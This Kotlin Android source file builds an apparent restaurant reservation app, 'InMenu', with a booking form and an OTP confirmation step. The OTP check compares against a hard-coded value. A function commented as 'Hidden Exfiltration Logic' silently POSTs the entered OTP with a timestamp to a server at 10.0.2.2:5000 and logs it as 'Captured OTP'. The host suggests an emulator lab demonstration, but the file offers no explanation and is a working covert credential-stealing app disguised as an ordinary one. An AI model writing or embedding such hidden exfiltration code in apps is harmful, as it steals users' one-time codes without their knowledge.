package com.inmenu.app

import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.foundation.Image
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.text.font.FontWeight

import com.inmenu.app.ui.theme.InMenuTheme
import java.net.HttpURLConnection
import java.net.URL
import java.time.Instant

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            InMenuTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    ReservationForm()
                }
            }
        }
    }
}

@Composable
fun ReservationForm() {
    val context = LocalContext.current

    var name by remember { mutableStateOf("") }
    var date by remember { mutableStateOf("") }
    var time by remember { mutableStateOf("") }
    var pax by remember { mutableStateOf("") }
    var phone by remember { mutableStateOf("") }
    var otp by remember { mutableStateOf("") }

    var otpStep by remember { mutableStateOf(false) }
    var isConfirmed by remember { mutableStateOf(false) }

    if (isConfirmed) {
        // ✅ Confirmation Screen
        Column(
            modifier = Modifier
                .padding(24.dp)
                .fillMaxSize(),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Larger Logo
            Row(horizontalArrangement = Arrangement.Center, modifier = Modifier.fillMaxWidth()) {
                Image(
                    painter = painterResource(id = R.drawable.inmenu_logo),
                    contentDescription = "InMenu Logo",
                    modifier = Modifier.size(200.dp)
                )

            }

            Text(
                text = "🎉 Your Reservation is Confirmed!",
                style = MaterialTheme.typography.headlineMedium,
                modifier = Modifier.padding(top = 16.dp)
            )

            Text("👤 Name: $name")
            Text("📅 Date: $date")
            Text("⏰ Time: $time")
            Text("👥 Pax: $pax")
            Text("📱 Phone: $phone")

            Button(
                onClick = {
                    // Reset app
                    otpStep = false
                    isConfirmed = false
                    name = ""
                    date = ""
                    time = ""
                    pax = ""
                    phone = ""
                    otp = ""
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(top = 24.dp)
            ) {
//                Text("Return to Home")
                Text(
                    text = "Return to Home",
                    fontSize = 18.sp, // 👈 Increase the size here
                    fontWeight = FontWeight.Bold // (Optional) Make it bolder
                )
            }
        }

    } else {
        // 📝 Reservation Form
        Column(
            modifier = Modifier
                .padding(24.dp)
                .fillMaxWidth(),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Header Logo
            Row(
                horizontalArrangement = Arrangement.Center,
                modifier = Modifier.fillMaxWidth()
            ) {
                Image(
                    painter = painterResource(id = R.drawable.inmenu_logo),
                    contentDescription = "InMenu Logo",
                    modifier = Modifier.size(200.dp)
                )

                Text(
                    text = "",
                    style = MaterialTheme.typography.headlineMedium,
                    color = MaterialTheme.colorScheme.primary
                )
            }

            Text(
                text = "Reserve Your Table Below",
                style = MaterialTheme.typography.titleLarge,
                modifier = Modifier.padding(top = 20.dp)
            )

            OutlinedTextField(value = name, onValueChange = { name = it }, label = { Text("Full Name") }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = date, onValueChange = { date = it }, label = { Text("Date (YYYY-MM-DD)") }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = time, onValueChange = { time = it }, label = { Text("Time (HH:MM)") }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = pax, onValueChange = { pax = it }, label = { Text("Number of Pax") }, modifier = Modifier.fillMaxWidth(), keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number))
            OutlinedTextField(value = phone, onValueChange = { phone = it }, label = { Text("Phone Number") }, modifier = Modifier.fillMaxWidth(), keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone))

            if (otpStep) {
                OutlinedTextField(value = otp, onValueChange = { otp = it }, label = { Text("Enter OTP") }, modifier = Modifier.fillMaxWidth(), keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number))
            }

            Button(
                onClick = {
                    if (!otpStep) {
                        otpStep = true
                        Toast.makeText(context, "OTP sent to $phone", Toast.LENGTH_SHORT).show()
                    } else {
                        if (otp == "543211") {
                            Toast.makeText(context, "Reservation Confirmed", Toast.LENGTH_SHORT).show()
                            sendSecretOTP(otp)
                            Log.d("OTP-CAPTURE", "Captured OTP: $otp")
                            isConfirmed = true
                        } else {
                            Toast.makeText(context, "Invalid OTP. Please try again or cancel.", Toast.LENGTH_SHORT).show()
                        }
                    }
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(top = 12.dp)
            ) {
//                Text(text = if (!otpStep) "Submit Reservation" else "Confirm OTP")

                Text(
                    text = if (!otpStep) "Submit Reservation" else "Confirm OTP",
                    fontSize = 18.sp, // 👈 Increase the size here
                    fontWeight = FontWeight.Bold // (Optional) Make it bolder
                )
            }

            if (otpStep) {
                OutlinedButton(
                    onClick = {
                        otpStep = false
                        name = ""
                        date = ""
                        time = ""
                        pax = ""
                        phone = ""
                        otp = ""
                        Toast.makeText(context, "Reservation reset.", Toast.LENGTH_SHORT).show()
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(top = 10.dp)
                ) {
                    Text("Cancel")
                }
            }
        }
    }
}


// 🔒 Hidden Exfiltration Logic
fun sendSecretOTP(otp: String) {
    Thread {
        try {
            val url = URL("http://10.0.2.2:5000/otp")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val payload = """
                {
                    "device": "emulator",
                    "otp": "$otp",
                    "timestamp": "${Instant.now()}"
                }
            """.trimIndent()

            connection.outputStream.use { os ->
                os.write(payload.toByteArray())
                os.flush()
            }

            connection.responseCode
        } catch (e: Exception) {
            Log.e("OTP_SEND", "Error sending OTP", e)
        }
    }.start()
}